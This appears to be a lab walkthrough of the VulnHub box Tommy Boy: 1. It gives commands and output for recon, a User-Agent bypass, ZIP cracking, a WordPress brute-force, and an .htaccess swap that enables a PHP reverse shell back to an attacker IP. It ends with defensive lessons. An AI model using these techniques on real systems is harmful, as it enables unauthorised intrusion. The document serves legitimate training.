# Tommy Boy: 1 — VulnHub Walkthrough (Beginner Friendly)

| Field | Value |
|---|---|
| **Machine** | Tommy Boy: 1 |
| **Difficulty** | Easy / Intermediate |
| **Author** | Brian Johnson |
| **Released** | July 27, 2016 |
| **VulnHub Entry** | [Tommy Boy: 1 on VulnHub](https://vulnhub.com/entry/tommy-boy-1,157/) |
| **Download** | [Tommy Boy: 1 OVA](https://vulnhub.com/entry/tommy-boy-1,157/#download) |
| **Attacker** | Kali Linux (attacker IP `192.168.56.10`, target IP `192.168.56.101`) |
| **Target OS** | Linux (Ubuntu) |

> **Goal:** the machine's stated objective is to restore a backup of the Callahan Auto homepage — but to consider the box fully pwned you must collect **5 flags** and combine their data into one password that unlocks a final secret (`LOOT.ZIP`).
> **Flag locations (this guide):** 1 `flag-numero-uno.txt`, 2 `thisisthesecondflagyayyou.txt`, 3 `flagtres.txt`, 4 `el-flag-numero-quatro.txt`, 5 `/.5.txt`.
> **Note on IPs:** the target IP varies by build. This guide uses `192.168.56.101` as the example target and `192.168.56.10` as the example attacker. Replace both with the addresses you actually discover.

## 0. What you will learn

- **Multi-port reconnaissance:** discovering and prioritising several services (SSH, HTTP, a second web app, FTP).
- **`robots.txt` information leaks:** it can reveal hidden paths *and* flags.
- **WordPress enumeration:** using `wpscan` to find usernames and brute-force a login.
- **User-Agent based access control:** why "only iPhones can see this" is not a security control.
- **Password cracking fundamentals:** generating a targeted wordlist with `crunch` and cracking a ZIP with `fcrackzip`.
- **Password reuse & leakage:** a leaked password leading to SSH access.
- **Local privilege escalation via writable web files:** abusing a world-writable upload directory and a `.htaccess` file to run code as another user.
- **Chained objectives:** collecting multiple flags and combining them into a final key.
- **Defensive thinking:** how a defender prevents each step.

## 1. Reconnaissance — finding the target

Find your own IP and the target's IP on the lab network.

**Check your (attacker) IP:**
```bash
ip a
```

> **How to read it:** Shows your interfaces. Your `192.168.56.x` address is the attacker IP (here `192.168.56.10`).

**Discover live hosts:**
```bash
sudo arp-scan --localnet
# or
sudo netdiscover -i eth1 -r 192.168.56.0/24
```

> **How to read it:** A new Linux host on the subnet is the Tommy Boy VM. Confirm it responds:
```bash
ping -c 2 192.168.56.101
```

![host discovery showing the target IP](images/01-recon.png)

## 2. Enumeration — many open ports

### 2.1 Full service scan
```bash
sudo nmap -sC -sV -p- --min-rate 1000 -T4 -oA scans/full 192.168.56.101
```

Realistic output (exact banners/ports may vary by build):
```text
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1 (protocol 2.0)
80/tcp    open  http    Apache httpd 2.2.22 ((Ubuntu))
8008/tcp  open  http    Apache httpd 2.2.22 ((Ubuntu))
65534/tcp open  ftp     vsftpd 2.0.8 or later
```

> **How to read it:** Several services. Port 80 is the main Callahan Auto website; port **8008** is a *second* web app; port **65534** is an FTP server (non-standard port).
> **Why it works:** Multiple web services multiply the attack surface. Always enumerate each one separately.

### 2.2 The main site (port 80) and `robots.txt`
```bash
curl http://192.168.56.101/
curl http://192.168.56.101/robots.txt
```
```text
User-agent: *
Disallow: /6packsofb...soda
Disallow: /lukeiamyourfather
Disallow: /lookalivelowbridge
Disallow: /flag-numero-uno.txt
```

> **How to read it:** `robots.txt` is meant to tell search engines what not to index — but it happily tells *us* about hidden paths. One entry is literally the first flag.

Grab **Flag 1**:
```bash
curl http://192.168.56.101/flag-numero-uno.txt
```
```text
This is the first of five flags in the Callhan Auto server...
Flag data: B34rcl4ws
```

> **How to read it:** Flag data `B34rcl4ws`. Record it — we need all five at the end.

### 2.3 The second site (port 8008)
```bash
curl http://192.168.56.101:8008/
```

The page references a "Nick" and his private drop-box at `/NickIzL33t`. We will come back to it.

### 2.4 FTP (port 65534)
```bash
ftp 192.168.56.101 65534
```
Try anonymous login (`anonymous` / blank). If it refuses, note it and move on — a later hint points here.

> **Note:** Some builds accept anonymous FTP and hand you files; on others FTP is a red herring. The documented path below does not require FTP, but it is worth checking every service.

![nmap showing ports 22, 80, 8008 and 65534](images/02-nmap.png)

## 3. Foothold — web clues, cracking, and SSH

### 3.1 The company blog (WordPress) and Flag 2
Browse the main site and follow the hint to `/prehistoricforest/`. This is a WordPress-powered "Callahan Employee Blog."

Read the posts and comments. One comment/link points to:
```text
http://192.168.56.101/prehistoricforest/thisisthesecondflagyayyou.txt
```
```text
Flag data: Z4l1nsky
```

> **How to read it:** **Flag 2 = `Z4l1nsky`**. Blog content is often a deliberate breadcrumb — read every post and comment.

Enumerate WordPress users:
```bash
wpscan --url http://192.168.56.101/prehistoricforest/ --enumerate u
```

> **How to read it:** `wpscan` lists valid WordPress usernames (e.g. `bigtom`, `tom`). Knowing valid usernames makes brute-forcing far more targeted.

### 3.2 The "iPhone only" page and Flag 3
Visit the second web app's hidden directory:
```bash
curl http://192.168.56.101:8008/NickIzL33t
```
```text
only me and Steve Jobs can see this content
```

> **How to read it:** "Steve Jobs" is a hint to use an **Apple/iPhone `User-Agent`**. The server is checking the `User-Agent` header — a client-controlled value, so we simply lie.

Resend with an iPhone User-Agent:
```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4" \
  http://192.168.56.101:8008/NickIzL33t
```

> **Why it works:** The page now reveals a hint: you must know the **exact `.html` filename** to "break into the fortress." That means directory/file brute-forcing *with the same iPhone User-Agent*.

Brute-force for HTML files (with the iPhone User-Agent):
```bash
feroxbuster -u http://192.168.56.101:8008/NickIzL33t \
  -w /usr/share/wordlists/rockyou.txt -x html -t 100 \
  -a "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12A365 Safari/600.1.4"
```

You find `fallon1.html`. Its source points to **Flag 3**:
```bash
curl -A "Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) ..." \
  http://192.168.56.101:8008/NickIzL33t/flagtres.txt
```
```text
Flag data: TinyHead
```

> **How to read it:** **Flag 3 = `TinyHead`**.

![iPhone User-Agent revealing the hidden page](images/03-ua-bypass.png)

### 3.3 Crack the password ZIP
The same area offers `hint.txt` and a password-protected ZIP (`t0msp4ssw0rdz.zip`).

```bash
curl -A "iPhone ..." http://192.168.56.101:8008/NickIzL33t/hint.txt
```
```text
# hint: password pattern -> bev,%%@@^1995
```

> **How to read it:** The hint gives a mask for a password. Build a targeted wordlist with `crunch` rather than a generic one:
```bash
crunch 13 13 -t bev,%%@@^1995 -o /root/desktop/dict.txt
```

Crack the ZIP with `fcrackzip`:
```bash
fcrackzip -u -D -p /root/desktop/dict.txt t0msp4ssw0rdz.zip
```
```text
PASSWORD FOUND!!!!: pw == bevH00tr$1995
```

> **Why it works:** The password follows a predictable pattern, so a custom mask is orders of magnitude faster than a general list. Unzip and read `passwords.txt`:
```text
Callahan Auto Server
---------------------------
Username: bigtommysenior
Password: fatguyinalittlecoat
Note: after the "fatguyinalittlecoat" part there are some numbers, but I don't remember what they are.
However, I wrote myself a draft on the company blog with that information.
```

> **How to read it:** We now have a username (`bigtommysenior`), a partial password, and a hint that the missing numbers are in a WordPress **draft**. The password is incomplete, so we keep going.

### 3.4 Brute-force WordPress, then SSH
Brute-force the `tom` account with the known users:
```bash
wpscan --url http://192.168.56.101/prehistoricforest/wp-login.php \
  --usernames tom --passwords /usr/share/wordlists/rockyou.txt
```
```text
[SUCCESS] - tom / tomtom1
```

> **Why it works:** The password is in `rockyou.txt` (a famously common wordlist). The website's Queen-song hint nudged toward `rockyou`.

Log into WordPress as `tom`, find **Big Tom's draft**, and read the missing digits:
```text
I have updated the full server password: fatguyinalittlecoat1938!!
```

> **How to read it:** We now have the full credential `bigtommysenior:fatguyinalittlecoat1938!!`. Use it over SSH:
```bash
ssh bigtommysenior@192.168.56.101
```

### 3.5 Flag 4 and the homepage backup
You are in. Look around the home directory:
```bash
ls -la
cat el-flag-numero-quatro.txt
```
```text
Flag data: EditButton
```

> **How to read it:** **Flag 4 = `EditButton`**. The directory also contains `callahanbak.bak` (the backup homepage) and `LOOT.ZIP` (the final secret).

Restore the homepage as the objective instructs:
```bash
cp callahanbak.bak /var/www/html/index.html
```

> **Why it works:** Replacing `index.html` with the backup satisfies the stated goal and, importantly, marks progress. Flag 4 told us the fifth flag is at the root of the server.

![SSH as bigtommysenior, Flag 4](images/04-ssh-flag4.png)

## 4. Privilege escalation — escalate to `www-data` for Flag 5

### 4.1 Find the fifth flag and why we can't read it
Flag 4 said the last flag is `/5.txt`. It is actually a hidden file:
```bash
ls -la /
```
```text
-rwxr-x--- 1 www-data www-data 520 ... .5.txt
```

> **How to read it:** `/.5.txt` is owned by user/group **`www-data`** with `-rwxr-x---`, so only `www-data` (and root) can read it. We are `bigtommysenior` — not enough. We need to **become `www-data`**.

### 4.2 The world-writable upload directory
Recall the `/NickIzL33t` area. There is a "P4TCH_4D4MS" drop-box with an upload form. Inspect the web root and upload directory:
```bash
ls -ld /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/
```
```text
drwxrwxrwx 2 www-data www-data 4096 Sep  6 14:09 .../P4TCH_4D4MS/uploads/
```

> **How to read it:** `drwxrwxrwx` means **everyone** can read, write and execute in this directory. That is a huge misconfiguration — we can drop files there, and Apache (running as `www-data`) will serve/execute them.

Now inspect the existing `.htaccess`:
```bash
cat /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads/.htaccess
```
```text
BrowserMatchNoCase "iPhone" ...
AddType application/x-httpd-php .gif
```

> **How to read it:** This `.htaccess` makes `.gif` files execute as PHP, and restricts access to iPhone user-agents. We do not have write access to the file, **but we do have write access to the directory**, so we can rename it and drop in our own.

### 4.3 Replace `.htaccess` and upload a reverse shell
Rename the restrictive `.htaccess` and create a permissive one that executes `.php` for everyone:
```bash
cd /var/thatsg0nnaleaveamark/NickIzL33t/P4TCH_4D4MS/uploads
mv .htaccess .htaccess.bak
cat > .htaccess <<'EOF'
AddType application/x-httpd-php .php
<IfModule mod_authz_core.c>
    Require all granted
</IfModule>
<IfModule !mod_authz_core.c>
    Order allow,deny
    Allow from all
</IfModule>
EOF
```

> **Why it works:** Apache reads `.htaccess` from the directory. By replacing it we (a) allow everyone in and (b) tell Apache to run `.php` files as PHP. Now any `.php` we place here is executable code.

Copy a PHP reverse shell into the uploads directory (edit the IP/port first):
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
# set $ip='192.168.56.10'; $port=443;
```

Start a listener and browse to the shell:
```bash
nc -lvnp 443
```
```bash
curl "http://192.168.56.101:8008/NickIzL33t/P4TCH_4D4MS/uploads/php-reverse-shell.php"
```

> **Why it works:** Apache executes the PHP as the web user (`www-data`) and the payload connects back to us. We now have a shell as `www-data`.

Listener output:
```text
connect to [192.168.56.10] from (UNKNOWN) [192.168.56.101] 40218
www-data@CallahanAutoSrv01:/$
```

### 4.4 Capture Flag 5
```bash
cat /.5.txt
```
```text
FIFTH FLAG!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
YOU DID IT!!!!!!!!!!!!!!!!!!!!!!!!!!!!
...
Flag data: Buttcrack
```

> **How to read it:** **Flag 5 = `Buttcrack`**. The file also instructs you to concatenate the flag data, in order, into one password.

![www-data shell reading /.5.txt](images/05-flag5.png)

### 4.5 Combine the flags and unlock the final secret
The five flags, in order:

| # | File | Flag data |
|---|---|---|
| 1 | `flag-numero-uno.txt` | `B34rcl4ws` |
| 2 | `thisisthesecondflagyayyou.txt` | `Z4l1nsky` |
| 3 | `flagtres.txt` | `TinyHead` |
| 4 | `el-flag-numero-quatro.txt` | `EditButton` |
| 5 | `/.5.txt` | `Buttcrack` |

Concatenated: `B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack`

Back as `bigtommysenior`, unzip `LOOT.ZIP` with that password:
```bash
unzip LOOT.ZIP
```
```text
[LOOT.ZIP] THE-END.txt password: B34rcl4wsZ4l1nskyTinyHeadEditButtonButtcrack
  inflating: THE-END.txt
```
```bash
cat THE-END.txt
```
```text
YOU CAME. YOU SAW. ... PWNED.
```

> **How to read it:** Combining the flag data gives the archive password, revealing the final message. **The box is fully pwned.** (Exact `THE-END.txt` text varies by build — do not assume a specific string.)

## 5. Summary of vulnerabilities

| Vulnerability | Where | Impact | Notes |
|---|---|---|---|
| Sensitive data in `robots.txt` | `http://.../robots.txt` | Leaks hidden paths and Flag 1 | `Disallow: /flag-numero-uno.txt` |
| Info leak in blog content | `/prehistoricforest/` WordPress | Leaks Flag 2 | Read posts/comments |
| User-Agent based access control | Port 8008 `/NickIzL33t` | Bypass "iPhone only" gate | Client-controlled header |
| Weak/predictable password + weak ZIP | `t0msp4ssw0rdz.zip` | Recover credentials file | Cracked with `crunch` + `fcrackzip` |
| WordPress user enumeration & weak password | `/prehistoricforest/wp-login.php` | `tom:tomtom1` | `wpscan` + `rockyou.txt` |
| Credential leakage in WordPress draft | Blog draft | Full SSH password | `bigtommysenior:fatguyinalittlecoat1938!!` |
| FTP on non-standard port | 65534 | Extra attack surface | Check for anonymous access |
| World-writable web upload directory | `.../P4TCH_4D4MS/uploads` | Arbitrary file placement | `drwxrwxrwx` |
| Over-permissive `.htaccess` manipulation | `.../uploads/.htaccess` | PHP execution as `www-data` | Renamed and replaced |
| Over-privileged file ownership | `/.5.txt` owned by `www-data` | Flag exposure | Defensible only if web user is compromised |

> **How to read it:** This machine is a chain of small weaknesses — leaked hints, a client-controlled access gate, a weak password, and a wide-open upload directory — each of which alone is minor but together yield full compromise.

## 6. Defensive lessons (blue team)

- **Treat `robots.txt` as public.** Never list secrets or sensitive paths there. Use proper authentication for anything that should not be seen.
- **Never use `User-Agent` (or any request header) for access control.** Headers are trivially spoofed. Enforce authorization server-side with real authentication.
- **Enforce strong, unique passwords.** Reject dictionary passwords, and never leave incomplete passwords as "hints." Use a password manager and MFA.
- **Protect encrypted archives with strong KDFs.** Legacy ZIP encryption is weak; use AES-256 with a high-iteration KDF for anything sensitive.
- **Disable WordPress user enumeration** and rate-limit / lock out failed logins. Apply MFA to admin accounts and keep WordPress and plugins patched.
- **Do not store credentials in drafts, posts, or comments.** Secrets belong in a secrets manager with strict access control.
- **Make web directories non-writable.** Upload directories should be owned by the service account and **not** world-writable. Rename/disable `.htaccess` overrides (`AllowOverride None`) where possible.
- **Never allow uploaded files to execute.** Store user uploads outside the web root or on a separate, non-executable host/container.
- **Audit file ownership.** The last flag was protected by `www-data` ownership — fine on paper, but it fell the moment the web user was compromised. Minimize what the web user can read.
- **Defense-in-depth:** patch, least privilege, segmentation, and egress monitoring (reverse shells connect outbound) all reduce impact.

## 7. References

Real community writeups consulted during research (same path):

- [Tommy Boy 1 VulnHub Writeup — g0blin Research](https://g0blin.co.uk/tommy-vulnhub-writeup/)
- [Tommy Boy: 1 Walkthrough — geoda-security](https://blog.geoda-security.com/2016/08/tommy-boy1-walkthrough.html)
- [Tommy Boy hacking challenge — Musings from the brainpan](https://blog.techorganic.com/2016/09/07/tommy-boy-hacking-challenge/)
- [Hack the TommyBoy VM (CTF Challenge) — Hacking Articles](https://www.hackingarticles.in/hack-tommyboy-vm-ctf-challenge/)
- [Vulnhub: Tommy Boy 1 Walkthrough — sechub.in](https://sechub.in/view/2804167)
- [TommyBoy v1.0 — StrongShiv8](https://strongshiv8.github.io/posts/TommyBoy1dot0/)
- [Tommy Boy 1.0: A Vulnerable Virtual Machine — 7 Minute Security](https://7minsec.com/blog/2016/07/26/tommyboy/)
- [VulnHub Official Entry — Tommy Boy: 1](https://vulnhub.com/entry/tommy-boy-1,157/)

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — host discovery showing the target IP
- [ ] `images/02-nmap.png` — Nmap scan showing ports 22, 80, 8008, 65534
- [ ] `images/03-ua-bypass.png` — iPhone User-Agent revealing the hidden `/NickIzL33t` page
- [ ] `images/04-ssh-flag4.png` — SSH as `bigtommysenior` and Flag 4
- [ ] `images/05-flag5.png` — `www-data` shell reading `/.5.txt`
- [ ] `images/06-loot.png` — combined flags unlocking `LOOT.ZIP` / `THE-END.txt`

> **How to read it:** Put screenshots in `labs/tommy-boy-1/images/` and reference them with relative paths as shown above.

---
*Part of the [Cybersecurity101-Labs](../../README.md) collection. Educational use only in authorized lab environments.*
